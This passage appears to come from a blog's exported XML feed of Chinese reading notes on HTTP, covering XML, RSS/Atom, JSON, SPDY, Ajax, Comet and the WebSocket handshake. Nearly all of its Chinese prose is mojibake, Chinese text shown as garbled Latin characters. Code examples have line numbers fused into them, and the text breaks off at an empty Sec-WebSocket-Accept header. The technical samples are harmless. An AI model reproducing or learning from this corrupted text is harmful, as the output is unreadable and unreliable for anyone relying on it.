ç”¨æµè§ˆå™¨æ‰“å¼€è¯¥æ–‡æ¡£æ—¶ï¼Œå°±ä¼šæ˜¾ç¤ºæŽ’åˆ—çš„åˆ—è¡¨å†…å®¹ï¼Œä½†å¦‚æžœè¿™äº›æ•°æ®è¢«å…¶ä»–ç¨‹åºè¯»å–ä¼šå‘ç”Ÿä»€ä¹ˆï¼ŸæŸäº›ç¨‹åºè™½ç„¶å…·å¤‡å¯é€šè¿‡è¯†åˆ«å¸ƒå±€ç‰¹å¾å–å‡ºæ–‡æœ¬çš„æ–¹æ³•ï¼Œä½†è¿™ä»½ HTML çš„æ ·å¼ä¸€æ—¦æ”¹å˜ï¼Œè¦è¯»å–æ•°æ®å†…å®¹ä¹Ÿå°±å˜å¾—ç›¸å¯¹å›°éš¾äº†ã€‚å¯è§ï¼Œä¸ºäº†ä¿æŒæ•°æ®çš„æ­£ç¡®è¯»å–ï¼ŒHTML ä¸é€‚åˆç”¨æ¥è®°å½•æ•°æ®ç»“æž„ã€‚ æŽ¥ç€å°†è¿™ä»½åˆ—è¡¨ä»¥ XML çš„å½¢å¼æ”¹å†™å°±æˆäº†ä»¥ä¸‹çš„ç¤ºä¾‹ã€‚ 12345678&lt;ç ”è®¨ä¼š ç¼–å·="TR001" ä¸»é¢˜="Webåº”ç”¨ç¨‹åºè„†å¼±æ€§è¯Šæ–­è®²åº§"&gt; &lt;ç±»åˆ«&gt;å®‰å…¨&lt;/ç±»åˆ«&gt; &lt;æ¦‚è¦&gt;ä¸ºæ·±å…¥ç ”ç©¶Webåº”ç”¨ç¨‹åºè„†å¼±æ€§è¯Šæ–­å¿…è¦çš„â€¦&lt;/æ¦‚è¦&gt;&lt;/ç ”è®¨ä¼š&gt;&lt;ç ”è®¨ä¼š ç¼–å·="TR002" ä¸»é¢˜="ç½‘ç»œç³»ç»Ÿè„†å¼±æ€§è¯Šæ–­è®²åº§"&gt; &lt;ç±»åˆ«&gt;å®‰å…¨&lt;/ç±»åˆ«&gt; &lt;æ¦‚è¦&gt;ä¸ºæ·±å…¥ç ”ç©¶ç½‘ç»œç³»ç»Ÿè„†å¼±æ€§è¯Šæ–­å¿…è¦çš„â€¦&lt;/æ¦‚è¦&gt;&lt;/ç ”è®¨ä¼š&gt; å‘å¸ƒæ›´æ–°ä¿¡æ¯çš„ RSS/AtomRSSï¼ˆç®€æ˜“ä¿¡æ¯èšåˆï¼Œä¹Ÿå«èšåˆå†…å®¹ï¼‰å’Œ Atom éƒ½æ˜¯å‘å¸ƒæ–°é—»æˆ–åšå®¢æ—¥å¿—ç­‰æ›´æ–°ä¿¡æ¯æ–‡æ¡£çš„æ ¼å¼çš„æ€»ç§°ã€‚ä¸¤è€…éƒ½ç”¨åˆ°äº† XMLã€‚ RSS æœ‰ä»¥ä¸‹ç‰ˆæœ¬ï¼Œåç§°å’Œç¼–å†™æ–¹å¼ä¹Ÿä¸ç›¸åŒã€‚ RSS 0.9ï¼ˆRDF Site Summaryï¼‰ï¼šæœ€åˆçš„ RSS ç‰ˆæœ¬ã€‚1999 å¹´ 3 æœˆç”±ç½‘æ™¯é€šä¿¡å…¬å¸è‡ªè¡Œå¼€å‘ç”¨äºŽå…¶é—¨æˆ·ç½‘ç«™ã€‚åŸºç¡€æž„å›¾åˆ›å»ºåœ¨åˆæœŸçš„ RDFè§„æ ¼ä¸Šã€‚ RSS 0.91ï¼ˆRich Site Summaryï¼‰ï¼šåœ¨ RSS0.9 çš„åŸºç¡€ä¸Šæ‰©å±•å…ƒç´ ï¼ŒäºŽ1999 å¹´ 7 æœˆå¼€å‘å®Œæ¯•ã€‚éž RDF è§„æ ¼ï¼Œä½¿ç”¨ XML æ–¹å¼ç¼–å†™ã€‚ RSS 1.0ï¼ˆRDF Site Summaryï¼‰ï¼šRSS è§„æ ¼æ­£å¤„äºŽæ··ä¹±çŠ¶æ€ã€‚2000 å¹´12 æœˆç”± RSS-DEV å·¥ä½œç»„å†æ¬¡é‡‡ç”¨ RSS0.9 ä¸­ä½¿ç”¨çš„ RDF è§„æ ¼å‘å¸ƒã€‚ RSS2.0ï¼ˆReally Simple Syndicationï¼‰ï¼šéž RSS1.0 å‘å±•è·¯çº¿ã€‚å¢žåŠ æ”¯æŒ RSS0.91 çš„å…¼å®¹æ€§ï¼Œ2000 å¹´ 12 æœˆç”± UserLand Software å…¬å¸å¼€å‘å®Œæˆã€‚ Atom å…·æœ‰ä»¥ä¸‹ä¸¤ç§æ ‡å‡†ã€‚Atom ä¾›ç¨¿æ ¼å¼ï¼ˆAtom Syndication Formatï¼‰ï¼šä¸ºå‘å¸ƒå†…å®¹è€Œåˆ¶å®šçš„ç½‘ç«™æ¶ˆæ¯æ¥æºæ ¼å¼ï¼Œå•è®² Atom æ—¶ï¼Œå°±æ˜¯æŒ‡æ­¤æ ‡å‡†ã€‚ Atom å‡ºç‰ˆåå®šï¼ˆAtom Publishing Protocolï¼‰ï¼šä¸º Web ä¸Šå†…å®¹çš„æ–°å¢žæˆ–ä¿®æ”¹è€Œåˆ¶å®šçš„åè®®ã€‚ ç”¨äºŽè®¢é˜…åšå®¢æ›´æ–°ä¿¡æ¯çš„ RSS é˜…è¯»å™¨ï¼Œè¿™ç§åº”ç”¨å‡ ä¹Žæ”¯æŒ RSS çš„æ‰€æœ‰ç‰ˆæœ¬ä»¥åŠ Atomã€‚ ä¸‹é¢æ˜¯ RSS1.0 çš„ç¤ºä¾‹ã€‚ 123456789101112131415161718192021&lt;?xml version="1.0" encoding="utf-8" ?&gt;&lt;?xml-stylesheet href="http://d.hatena.ne.jp/sen-u/rssxsl" type="text/xsl" media="screen"?&gt;&lt;rdf:RDFxmlns="http://purl.org/rss/1.0/"xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"xmlns:content="http://purl.org/rss/1.0/modules/content/"xmlns:dc="http://purl.org/dc/elements/1.1/"xml:lang="ja"&gt;&lt;channel rdf:about="http://d.hatena.ne.jp/sen-u/rss"&gt;&lt;title&gt;å…”å­çš„æ–‡å­¦æ—¥è®°&lt;/title&gt;&lt;link&gt;http://d.hatena.ne.jp/sen-u/&lt;/link&gt;&lt;description&gt;å…”å­çš„æ–‡å­¦æ—¥è®°&lt;/description&gt;&lt;/channel&gt;&lt;item rdf:about="http://d.hatena.ne.jp/sen-u/20121215/p1"&gt;&lt;title&gt;[security]æä¾›è„†å¼±æ€§æ‚¬èµå¥–é‡‘è®¡åˆ’çš„ç½‘ç«™ä¸€è§ˆ&lt;/title&gt;&lt;link&gt;http://d.hatena.ne.jp/sen-u/20121215/p1&lt;/link&gt;&lt;description&gt; æ­£æ˜¯æ‰€è°“â€œæ˜¯æ‰€è°“ Bounty Programsâ€ã€å¤„ç†æŽ¥å—Webè„†å¼±æ€§çš„ç›¸å…³ä¿¡æ¯ï¼Œå¹¶æä¾›å¥–é‡‘çš„è®¡åˆ’ ...&lt;/description&gt;&lt;dc:creator&gt;sen-u&lt;/dc:creator&gt;&lt;dc:date&gt;2012-12-15&lt;/dc:date&gt;&lt;dc:subject&gt;security&lt;/dc:subject&gt;&lt;/item&gt; JavaScript è¡ç”Ÿçš„è½»é‡çº§æ˜“ç”¨ JSONJSONï¼ˆJavaScript Object Notationï¼‰æ˜¯ä¸€ç§ä»¥JavaScriptï¼ˆECMAScriptï¼‰çš„å¯¹è±¡è¡¨ç¤ºæ³•ä¸ºåŸºç¡€çš„è½»é‡çº§æ•°æ®æ ‡è®°è¯­è¨€ã€‚èƒ½å¤Ÿå¤„ç†çš„æ•°æ®ç±»åž‹æœ‰ false/null/true/ å¯¹è±¡ / æ•°ç»„ / æ•°å­— / å­—ç¬¦ä¸²ï¼Œè¿™ 7 ç§ç±»åž‹ã€‚ 1&#123;"name": "Web Application Security", "num": "TR001"&#125; JSON è®©æ•°æ®æ›´è½»æ›´çº¯ç²¹ï¼Œå¹¶ä¸” JSON çš„å­—ç¬¦ä¸²å½¢å¼å¯è¢« JavaScriptè½»æ˜“åœ°è¯»å…¥ã€‚å½“åˆé…åˆ XML ä½¿ç”¨çš„ Ajax æŠ€æœ¯ä¹Ÿè®© JSON çš„åº”ç”¨å˜å¾—æ›´ä¸ºå¹¿æ³›ã€‚å¦å¤–ï¼Œå…¶ä»–å„ç§ç¼–ç¨‹è¯­è¨€ä¹Ÿæä¾›ä¸°å¯Œçš„åº“ç±»ï¼Œä»¥è¾¾åˆ°è½»ä¾¿æ“ä½œ JSON çš„ç›®çš„ã€‚ å‚è€ƒé“¾æŽ¥ï¼šhttps://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥æµ…å‡ºHTTPï¼Œä»Žå¼€å§‹åˆ°æ”¾å¼ƒï¼ˆç¬¬ä¹ç« ï¼‰â€”â€” åŸºäºŽ HTTP çš„åŠŸèƒ½è¿½åŠ åè®®]]></title>
    <url>%2F2018-09-15-read-%E5%9B%BE%E8%A7%A3HTTP-Part9.html</url>
    <content type="text"><![CDATA[ç¬¬ä¹ç«  åŸºäºŽ HTTP çš„åŠŸèƒ½è¿½åŠ åè®®åŸºäºŽ HTTP çš„åè®®éšç€æ—¶ä»£çš„å‘å±•ï¼ŒWeb çš„ç”¨é€”æ›´å…·å¤šæ ·æ€§ï¼Œæ¯”å¦‚æ¼”åŒ–æˆåœ¨çº¿è´­ç‰©ç½‘ç«™ã€SNSï¼ˆSocial Networking Serviceï¼Œç¤¾äº¤ç½‘ç»œæœåŠ¡ï¼‰ã€ä¼ä¸šæˆ–ç»„ç»‡å†…éƒ¨çš„å„ç§ç®¡ç†å·¥å…·ï¼Œç­‰ç­‰ã€‚ è€Œè¿™äº›ç½‘ç«™æ‰€è¿½æ±‚çš„åŠŸèƒ½å¯é€šè¿‡ Web åº”ç”¨å’Œè„šæœ¬ç¨‹åºå®žçŽ°ã€‚å³ä½¿è¿™äº›åŠŸèƒ½å·²ç»æ»¡è¶³éœ€æ±‚ï¼Œåœ¨æ€§èƒ½ä¸Šå´æœªå¿…æœ€ä¼˜ï¼Œè¿™æ˜¯å› ä¸º HTTP åè®®ä¸Šçš„é™åˆ¶ä»¥åŠè‡ªèº«æ€§èƒ½æœ‰é™ã€‚ HTTP åŠŸèƒ½ä¸Šçš„ä¸è¶³å¯é€šè¿‡åˆ›å»ºä¸€å¥—å…¨æ–°çš„åè®®æ¥å¼¥è¡¥ã€‚å¯æ˜¯ç›®å‰åŸºäºŽ HTTP çš„ Web æµè§ˆå™¨çš„ä½¿ç”¨çŽ¯å¢ƒå·²éå¸ƒå…¨çƒï¼Œå› æ­¤æ— æ³•å®Œå…¨æŠ›å¼ƒHTTPã€‚æœ‰ä¸€äº›æ–°åè®®çš„è§„åˆ™æ˜¯åŸºäºŽ HTTP çš„ï¼Œå¹¶åœ¨æ­¤åŸºç¡€ä¸Šæ·»åŠ äº†æ–°çš„åŠŸèƒ½ã€‚ æ¶ˆé™¤ HTTP ç“¶é¢ˆçš„ SPDYï¼ˆçŽ°å¦‚ä»Šé€æ¸è¢«æ·˜æ±°ï¼‰Google åœ¨ 2010 å¹´å‘å¸ƒäº† SPDYï¼ˆå–è‡ª SPeeDYï¼Œå‘éŸ³åŒ speedyï¼‰ï¼Œå…¶å¼€å‘ç›®æ ‡æ—¨åœ¨è§£å†³ HTTP çš„æ€§èƒ½ç“¶é¢ˆï¼Œç¼©çŸ­ Web é¡µé¢çš„åŠ è½½æ—¶é—´ï¼ˆ50%ï¼‰ã€‚ SPDY - The Chromium Projects http://www.chromium.org/spdy/ HTTP çš„ç“¶é¢ˆä½¿ç”¨ HTTP åè®®æŽ¢çŸ¥æœåŠ¡å™¨ä¸Šæ˜¯å¦æœ‰å†…å®¹æ›´æ–°ï¼Œå°±å¿…é¡»é¢‘ç¹åœ°ä»Žå®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨ç«¯è¿›è¡Œç¡®è®¤ã€‚å¦‚æžœæœåŠ¡å™¨ä¸Šæ²¡æœ‰å†…å®¹æ›´æ–°ï¼Œé‚£ä¹ˆå°±ä¼šäº§ç”Ÿå¾’åŠ³çš„é€šä¿¡ã€‚ è‹¥æƒ³åœ¨çŽ°æœ‰ Web å®žçŽ°æ‰€éœ€çš„åŠŸèƒ½ï¼Œä»¥ä¸‹è¿™äº› HTTP æ ‡å‡†å°±ä¼šæˆä¸ºç“¶é¢ˆã€‚ ä¸€æ¡è¿žæŽ¥ä¸Šåªèƒ½å‘é€ä¸€ä¸ªè¯·æ±‚ è¯·æ±‚åªèƒ½ä»Žå®¢æˆ·ç«¯å¼€å§‹ã€‚å®¢æˆ·ç«¯ä¸å¯ä»¥æŽ¥å—é™¤å“åº”ä»¥å¤–çš„æŒ‡ä»¤ è¯·æ±‚/ å“åº” é¦–éƒ¨æœªç»åŽ‹ç¼©å°±å‘é€ï¼Œé¦–éƒ¨æ¶ˆæ¯è¶Šå¤šå»¶è¿Ÿè¶Šå¤§ã€‚ å‘é€å†—é•¿çš„é¦–éƒ¨ï¼Œæ¯æ¬¡äº’ç›¸å‘é€ç›¸åŒçš„é¦–éƒ¨é€ æˆçš„æµªè´¹è¾ƒå¤šã€‚ å¯ä»»æ„é€‰æ‹©æ•°æ®åŽ‹ç¼©æ ¼å¼ï¼Œéžå¼ºåˆ¶åŽ‹ç¼©å‘é€ã€‚ Ajax çš„è§£å†³æ–¹æ³•Ajaxï¼ˆAsynchronous JavaScript and XMLï¼Œå¼‚æ­¥ JavaScript ä¸Ž XML æŠ€æœ¯ï¼‰æ˜¯ä¸€ç§æœ‰æ•ˆåˆ©ç”¨ JavaScript å’Œ DOM ï¼ˆDocument Object Modelï¼Œæ–‡æ¡£å¯¹è±¡æ¨¡åž‹ï¼‰çš„æ“ä½œï¼Œä»¥è¾¾åˆ°å±€éƒ¨ Web é¡µé¢æ›¿æ¢åŠ è½½çš„å¼‚æ­¥é€šä¿¡æ‰‹æ®µã€‚å’Œä»¥å‰çš„é€šä¿¡ç›¸æ¯”ï¼Œç”±äºŽå®ƒåªæ›´æ–°ä¸€éƒ¨åˆ†é¡µé¢ï¼Œå“åº”ä¸­ä¼ è¾“çš„æ•°æ®é‡ä¼šå› æ­¤å‡å°‘ï¼Œè¿™ä¸€ä¼˜ç‚¹æ˜¯æ˜¾è€Œæ˜“è§çš„ã€‚ Ajax çš„æ ¸å¿ƒæŠ€æœ¯æ˜¯åä¸º XMLHttpRequest çš„ APIï¼Œé€šè¿‡ JavaScript è„šæœ¬è¯­è¨€çš„è°ƒç”¨å°±èƒ½å’ŒæœåŠ¡å™¨è¿›è¡Œ HTTP é€šä¿¡ã€‚å€Ÿç”±è¿™ç§æ‰‹æ®µï¼Œå°±èƒ½ä»Žå·²åŠ è½½å®Œæ¯•çš„ Web é¡µé¢ä¸Šå‘èµ·è¯·æ±‚ï¼Œåªæ›´æ–°å±€éƒ¨é¡µé¢ã€‚ è€Œåˆ©ç”¨ Ajax å®žæ—¶åœ°ä»ŽæœåŠ¡å™¨èŽ·å–å†…å®¹ï¼Œæœ‰å¯èƒ½ä¼šå¯¼è‡´å¤§é‡è¯·æ±‚äº§ç”Ÿã€‚å¦å¤–ï¼ŒAjax ä»æœªè§£å†³ HTTP åè®®æœ¬èº«å­˜åœ¨çš„é—®é¢˜ã€‚ Comet çš„è§£å†³æ–¹æ³•ä¸€æ—¦æœåŠ¡å™¨ç«¯æœ‰å†…å®¹æ›´æ–°ï¼ŒComet ä¸ä¼šè®©è¯·æ±‚ç­‰å¾…ï¼Œè€Œæ˜¯ç›´æŽ¥ç»™å®¢æˆ·ç«¯è¿”å›žå“åº”ã€‚è¿™æ˜¯ä¸€ç§é€šè¿‡å»¶è¿Ÿåº”ç­”ï¼Œæ¨¡æ‹Ÿå®žçŽ°æœåŠ¡å™¨ç«¯å‘å®¢æˆ·ç«¯æŽ¨é€ï¼ˆServer Pushï¼‰çš„åŠŸèƒ½ã€‚ é€šå¸¸ï¼ŒæœåŠ¡å™¨ç«¯æŽ¥æ”¶åˆ°è¯·æ±‚ï¼Œåœ¨å¤„ç†å®Œæ¯•åŽå°±ä¼šç«‹å³è¿”å›žå“åº”ï¼Œä½†ä¸ºäº†å®žçŽ°æŽ¨é€åŠŸèƒ½ï¼ŒComet ä¼šå…ˆå°†å“åº”ç½®äºŽæŒ‚èµ·çŠ¶æ€ï¼Œå½“æœåŠ¡å™¨ç«¯æœ‰å†…å®¹æ›´æ–°æ—¶ï¼Œå†è¿”å›žè¯¥å“åº”ã€‚å› æ­¤ï¼ŒæœåŠ¡å™¨ç«¯ä¸€æ—¦æœ‰æ›´æ–°ï¼Œå°±å¯ä»¥ç«‹å³åé¦ˆç»™å®¢æˆ·ç«¯ã€‚ å†…å®¹ä¸Šè™½ç„¶å¯ä»¥åšåˆ°å®žæ—¶æ›´æ–°ï¼Œä½†ä¸ºäº†ä¿ç•™å“åº”ï¼Œä¸€æ¬¡è¿žæŽ¥çš„æŒç»­æ—¶é—´ä¹Ÿå˜é•¿äº†ã€‚æœŸé—´ï¼Œä¸ºäº†ç»´æŒè¿žæŽ¥ä¼šæ¶ˆè€—æ›´å¤šçš„èµ„æºã€‚å¦å¤–ï¼ŒCometä¹Ÿä»æœªè§£å†³ HTTP åè®®æœ¬èº«å­˜åœ¨çš„é—®é¢˜ã€‚ SPDY çš„ç›®æ ‡é™†ç»­å‡ºçŽ°çš„ Ajax å’Œ Comet ç­‰æé«˜æ˜“ç”¨æ€§çš„æŠ€æœ¯ï¼Œä¸€å®šç¨‹åº¦ä¸Šä½¿ HTTPå¾—åˆ°äº†æ”¹å–„ï¼Œä½† HTTP åè®®æœ¬èº«çš„é™åˆ¶ä¹Ÿä»¤äººæœ‰äº›æŸæ‰‹æ— ç­–ã€‚ä¸ºäº†è¿›è¡Œæ ¹æœ¬æ€§çš„æ”¹å–„ï¼Œéœ€è¦æœ‰ä¸€äº›åè®®å±‚é¢ä¸Šçš„æ”¹åŠ¨ã€‚å¤„äºŽæŒç»­å¼€å‘çŠ¶æ€ä¸­çš„ SPDY åè®®ï¼Œæ­£æ˜¯ä¸ºäº†åœ¨åè®®çº§åˆ«æ¶ˆé™¤ HTTPæ‰€é­é‡çš„ç“¶é¢ˆã€‚ ï¼ˆGoogleå®£å¸ƒè®¡åˆ’æ·˜æ±°è¯¥å…¬å¸åœ¨2009å¹´æŽ¨å‡ºçš„SPDYåè®®ï¼ŒSPDYåŽŸæœ¬å®šä½ä¸ºæ›¿ä»£HTTPåè®®çš„æ–°åè®®ï¼ŒGoogleåŽŸæœ¬æ‰“ç®—ä»¥å®ƒæ¥åŠ é€ŸHTTPçš„ä¼ è¾“é€Ÿåº¦å¹¶æŽ¨åŠ¨æˆä¸ºæ ‡å‡†ï¼Œä¸è¿‡çŽ°åœ¨å†³å®šå°†æ”¯æŒHTTP/2ï¼Œå¹¶é€æ¸æ·˜æ±°SPDYï¼‰ SPDY çš„è®¾è®¡ä¸ŽåŠŸèƒ½SPDY æ²¡æœ‰å®Œå…¨æ”¹å†™ HTTP åè®®ï¼Œè€Œæ˜¯åœ¨ TCP/IP çš„åº”ç”¨å±‚ä¸Žè¿è¾“å±‚ä¹‹é—´é€šè¿‡æ–°åŠ ä¼šè¯å±‚çš„å½¢å¼è¿ä½œã€‚åŒæ—¶ï¼Œè€ƒè™‘åˆ°å®‰å…¨æ€§é—®é¢˜ï¼ŒSPDY è§„å®šé€šä¿¡ä¸­ä½¿ç”¨ SSLã€‚ SPDY ä»¥ä¼šè¯å±‚çš„å½¢å¼åŠ å…¥ï¼ŒæŽ§åˆ¶å¯¹æ•°æ®çš„æµåŠ¨ï¼Œä½†è¿˜æ˜¯é‡‡ç”¨ HTTPå»ºç«‹é€šä¿¡è¿žæŽ¥ã€‚å› æ­¤ï¼Œå¯ç…§å¸¸ä½¿ç”¨ HTTP çš„ GET å’Œ POST ç­‰æ–¹ æ³•ã€Cookie ä»¥åŠ HTTP æŠ¥æ–‡ç­‰ã€‚ ä½¿ç”¨ SPDY åŽï¼ŒHTTP åè®®é¢å¤–èŽ·å¾—ä»¥ä¸‹åŠŸèƒ½ã€‚ å¤šè·¯å¤ç”¨æµé€šè¿‡å•ä¸€çš„ TCP è¿žæŽ¥ï¼Œå¯ä»¥æ— é™åˆ¶å¤„ç†å¤šä¸ª HTTP è¯·æ±‚ã€‚æ‰€æœ‰è¯·æ±‚çš„å¤„ç†éƒ½åœ¨ä¸€æ¡ TCP è¿žæŽ¥ä¸Šå®Œæˆï¼Œå› æ­¤ TCP çš„å¤„ç†æ•ˆçŽ‡å¾—åˆ°æé«˜ èµ‹äºˆè¯·æ±‚ä¼˜å…ˆçº§SPDY ä¸ä»…å¯ä»¥æ— é™åˆ¶åœ°å¹¶å‘å¤„ç†è¯·æ±‚ï¼Œè¿˜å¯ä»¥ç»™è¯·æ±‚é€ä¸ªåˆ†é…ä¼˜å…ˆçº§é¡ºåºã€‚è¿™æ ·ä¸»è¦æ˜¯ä¸ºäº†åœ¨å‘é€å¤šä¸ªè¯·æ±‚æ—¶ï¼Œè§£å†³å› å¸¦å®½ä½Žè€Œå¯¼è‡´å“åº”å˜æ…¢çš„é—®é¢˜ã€‚ åŽ‹ç¼© HTTP é¦–éƒ¨åŽ‹ç¼© HTTP è¯·æ±‚å’Œå“åº”çš„é¦–éƒ¨ã€‚è¿™æ ·ä¸€æ¥ï¼Œé€šä¿¡äº§ç”Ÿçš„æ•°æ®åŒ…æ•°é‡å’Œå‘é€çš„å­—èŠ‚æ•°å°±æ›´å°‘äº†ã€‚ æŽ¨é€åŠŸèƒ½æ”¯æŒæœåŠ¡å™¨ä¸»åŠ¨å‘å®¢æˆ·ç«¯æŽ¨é€æ•°æ®çš„åŠŸèƒ½ã€‚è¿™æ ·ï¼ŒæœåŠ¡å™¨å¯ç›´æŽ¥å‘é€æ•°æ®ï¼Œè€Œä¸å¿…ç­‰å¾…å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚ æœåŠ¡å™¨æç¤ºåŠŸèƒ½æœåŠ¡å™¨å¯ä»¥ä¸»åŠ¨æç¤ºå®¢æˆ·ç«¯è¯·æ±‚æ‰€éœ€çš„èµ„æºã€‚ç”±äºŽåœ¨å®¢æˆ·ç«¯å‘çŽ°èµ„æºä¹‹å‰å°±å¯ä»¥èŽ·çŸ¥èµ„æºçš„å­˜åœ¨ï¼Œå› æ­¤åœ¨èµ„æºå·²ç¼“å­˜ç­‰æƒ…å†µä¸‹ï¼Œå¯ä»¥é¿å…å‘é€ä¸å¿…è¦çš„è¯·æ±‚ã€‚ SPDY æ¶ˆé™¤ Web ç“¶é¢ˆäº†å—SPDY åŸºæœ¬ä¸Šåªæ˜¯å°†å•ä¸ªåŸŸåï¼ˆ IP åœ°å€ï¼‰çš„é€šä¿¡å¤šè·¯å¤ç”¨ï¼Œæ‰€ä»¥å½“ä¸€ä¸ª Web ç½‘ç«™ä¸Šä½¿ç”¨å¤šä¸ªåŸŸåä¸‹çš„èµ„æºï¼Œæ”¹å–„æ•ˆæžœå°±ä¼šå—åˆ°é™åˆ¶ã€‚ SPDY çš„ç¡®æ˜¯ä¸€ç§å¯æœ‰æ•ˆæ¶ˆé™¤ HTTP ç“¶é¢ˆçš„æŠ€æœ¯ï¼Œä½†å¾ˆå¤š Web ç½‘ç«™å­˜åœ¨çš„é—®é¢˜å¹¶éžä»…ä»…æ˜¯ç”± HTTP ç“¶é¢ˆæ‰€å¯¼è‡´ã€‚å¯¹ Web æœ¬èº«çš„é€Ÿåº¦æå‡ï¼Œè¿˜åº”è¯¥ä»Žå…¶ä»–å¯ç»†è‡´é’»ç ”çš„åœ°æ–¹å…¥æ‰‹ï¼Œæ¯”å¦‚æ”¹å–„ Web å†…å®¹çš„ç¼–å†™æ–¹å¼ç­‰ã€‚ ä½¿ç”¨æµè§ˆå™¨è¿›è¡Œå…¨åŒå·¥é€šä¿¡çš„WebSocketåˆ©ç”¨ Ajax å’Œ Comet æŠ€æœ¯è¿›è¡Œé€šä¿¡å¯ä»¥æå‡ Web çš„æµè§ˆé€Ÿåº¦ã€‚ä½†é—®é¢˜åœ¨äºŽé€šä¿¡è‹¥ä½¿ç”¨ HTTP åè®®ï¼Œå°±æ— æ³•å½»åº•è§£å†³ç“¶é¢ˆé—®é¢˜ã€‚WebSocketç½‘ç»œæŠ€æœ¯æ­£æ˜¯ä¸ºè§£å†³è¿™äº›é—®é¢˜è€Œå®žçŽ°çš„ä¸€å¥—æ–°åè®®åŠ APIã€‚ å½“æ—¶ç­¹åˆ’å°† WebSocket ä½œä¸º HTML5 æ ‡å‡†çš„ä¸€éƒ¨åˆ†ï¼Œè€ŒçŽ°åœ¨å®ƒå´é€æ¸å˜æˆäº†ç‹¬ç«‹çš„åè®®æ ‡å‡†ã€‚WebSocket é€šä¿¡åè®®åœ¨ 2011 å¹´ 12 æœˆ 11 æ—¥ï¼Œè¢« RFC 6455 - The WebSocket Protocol å®šä¸ºæ ‡å‡†ã€‚ WebSocket çš„è®¾è®¡ä¸ŽåŠŸèƒ½WebSocketï¼Œå³ Web æµè§ˆå™¨ä¸Ž Web æœåŠ¡å™¨ä¹‹é—´å…¨åŒå·¥é€šä¿¡æ ‡å‡†ã€‚å…¶ä¸­ï¼ŒWebSocket åè®®ç”± IETF å®šä¸ºæ ‡å‡†ï¼ŒWebSocket API ç”± W3C å®šä¸ºæ ‡å‡†ã€‚ä»åœ¨å¼€å‘ä¸­çš„ WebSocket æŠ€æœ¯ä¸»è¦æ˜¯ä¸ºäº†è§£å†³ Ajax å’Œ Cometé‡Œ XMLHttpRequest é™„å¸¦çš„ç¼ºé™·æ‰€å¼•èµ·çš„é—®é¢˜ã€‚ WebSocket åè®®ä¸€æ—¦ Web æœåŠ¡å™¨ä¸Žå®¢æˆ·ç«¯ä¹‹é—´å»ºç«‹èµ· WebSocket åè®®çš„é€šä¿¡è¿žæŽ¥ï¼Œä¹‹åŽæ‰€æœ‰çš„é€šä¿¡éƒ½ä¾é è¿™ä¸ªä¸“ç”¨åè®®è¿›è¡Œã€‚é€šä¿¡è¿‡ç¨‹ä¸­å¯äº’ç›¸å‘é€JSONã€XMLã€HTML æˆ–å›¾ç‰‡ç­‰ä»»æ„æ ¼å¼çš„æ•°æ®ã€‚ ç”±äºŽæ˜¯å»ºç«‹åœ¨ HTTP åŸºç¡€ä¸Šçš„åè®®ï¼Œå› æ­¤è¿žæŽ¥çš„å‘èµ·æ–¹ä»æ˜¯å®¢æˆ·ç«¯ï¼Œè€Œä¸€æ—¦ç¡®ç«‹ WebSocket é€šä¿¡è¿žæŽ¥ï¼Œä¸è®ºæœåŠ¡å™¨è¿˜æ˜¯å®¢æˆ·ç«¯ï¼Œä»»æ„ä¸€æ–¹éƒ½å¯ç›´æŽ¥å‘å¯¹æ–¹å‘é€æŠ¥æ–‡ã€‚ WebSocket åè®®çš„ä¸»è¦ç‰¹ç‚¹ã€‚æŽ¨é€åŠŸèƒ½ æ”¯æŒç”±æœåŠ¡å™¨å‘å®¢æˆ·ç«¯æŽ¨é€æ•°æ®çš„æŽ¨é€åŠŸèƒ½ã€‚è¿™æ ·ï¼ŒæœåŠ¡å™¨å¯ç›´æŽ¥å‘é€æ•°æ®ï¼Œè€Œä¸å¿…ç­‰å¾…å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚ å‡å°‘é€šä¿¡é‡ åªè¦å»ºç«‹èµ· WebSocket è¿žæŽ¥ï¼Œå°±å¸Œæœ›ä¸€ç›´ä¿æŒè¿žæŽ¥çŠ¶æ€ã€‚å’Œ HTTP ç›¸æ¯”ï¼Œä¸ä½†æ¯æ¬¡è¿žæŽ¥æ—¶çš„æ€»å¼€é”€å‡å°‘ï¼Œè€Œä¸”ç”±äºŽ WebSocket çš„é¦–éƒ¨ä¿¡æ¯å¾ˆå°ï¼Œé€šä¿¡é‡ä¹Ÿç›¸åº”å‡å°‘äº†ã€‚ ä¸ºäº†å®žçŽ° WebSocket é€šä¿¡ï¼Œåœ¨ HTTP è¿žæŽ¥å»ºç«‹ä¹‹åŽï¼Œéœ€è¦å®Œæˆä¸€æ¬¡â€œæ¡æ‰‹â€ï¼ˆHandshakingï¼‰çš„æ­¥éª¤ã€‚ æ¡æ‰‹Â·è¯·æ±‚ ä¸ºäº†å®žçŽ° WebSocket é€šä¿¡ï¼Œéœ€è¦ç”¨åˆ° HTTP çš„ Upgrade é¦–éƒ¨å­—æ®µï¼Œå‘ŠçŸ¥æœåŠ¡å™¨é€šä¿¡åè®®å‘ç”Ÿæ”¹å˜ï¼Œä»¥è¾¾åˆ°æ¡æ‰‹çš„ç›®çš„ã€‚ 12345678GET /chat HTTP/1.1Host: server.example.comUpgrade: websocketConnection: UpgradeSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==Origin: http://example.comSec-WebSocket-Protocol: chat, superchatSec-WebSocket-Version: 13 Sec-WebSocket-Key å­—æ®µå†…è®°å½•ç€æ¡æ‰‹è¿‡ç¨‹ä¸­å¿…ä¸å¯å°‘çš„é”®å€¼ã€‚Sec-WebSocket-Protocol å­—æ®µå†…è®°å½•ä½¿ç”¨çš„å­åè®®ã€‚ å­åè®®æŒ‰ WebSocket åè®®æ ‡å‡†åœ¨è¿žæŽ¥åˆ†å¼€ä½¿ç”¨æ—¶ï¼Œå®šä¹‰é‚£äº›è¿žæŽ¥çš„åç§°ã€‚ æ¡æ‰‹Â·å“åº” å¯¹äºŽä¹‹å‰çš„è¯·æ±‚ï¼Œè¿”å›žçŠ¶æ€ç  101 Switching Protocols çš„å“åº”ã€‚ 12345HTTP/1.1 101 Switching ProtocolsUpgrade: websocketConnection: UpgradeSec-WebSocket-Accept: 